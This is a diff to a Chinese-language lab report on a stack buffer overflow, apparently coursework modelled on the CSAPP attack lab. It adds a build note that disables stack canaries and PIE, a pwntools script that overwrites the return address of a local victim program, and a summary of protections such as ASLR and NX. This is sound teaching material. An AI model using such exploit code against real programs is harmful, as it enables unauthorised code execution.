@@ -6,6 +6,12 @@
 
 利用缓冲区溢出对程序进行攻击，实现非法访问等操作。
 
+## 环境配置
+
+1. WSL2 Ubuntu22.04LTS
+2. gcc version 11.3.0 (Ubuntu 11.3.0-1ubuntu1~22.04)
+3. 编译时可直接执行 `make` 来关闭 Stack Canary 保护和 PIE 保护等。
+
 ## 实验步骤
 
 1. 编写受害程序代码
@@ -94,16 +100,42 @@
     ``` python
     # tool.py
     from pwn import *
-
+    
     sh = process("./source")
     sh.recvline()
     sh.sendline(b'0'*28 + p32(0x8049196))
     print(sh.recvline())
     ```
 
-
 ## 实验结果
 
-执行 `python tool.py`：
+利用 pwntools 进行攻击，执行 `python tool.py`：
 
-![](./result.png)
+```python
+from pwn import *
+
+sh = process("./source")
+sh.recvline()
+sh.sendline(b'A'*28 + p32(0x8049196))
+print(sh.recvline())
+```
+
+![image-20230507165100184](..\images\image-20230507165100184.png)
+
+## 影响因素分析
+
+针对栈溢出攻击，有如下常见的保护方式：
+1. Stack Canary：在栈帧中插入随机的特殊值，返回时检查其是否被更改；
+2. 数据执行保护（DEP）：防止攻击者执行位于可执行内存区域之外的恶意代码；
+3. Address Space Layout Randomization（ASLR）：随机化可执行文件、库和操作系统组件的内存布局；
+4. 栈的非执行标志（NX）：NX 位允许操作系统通过将内存页标记为不可执行来保护内存免受栈溢出攻击。
+
+由于本实验仅考虑最简单的无保护措施下的栈溢出攻击，因此较为简单，否则应当尝试 ROP 等攻击方式。
+
+## 完整代码
+
+完整代码请参考 https://cloud.tsinghua.edu.cn/d/1a96b198a593475abf7f/
+
+## 参考资料
+
+- [CSAPP Attack Lab README.md](http://csapp.cs.cmu.edu/3e/README-attacklab)
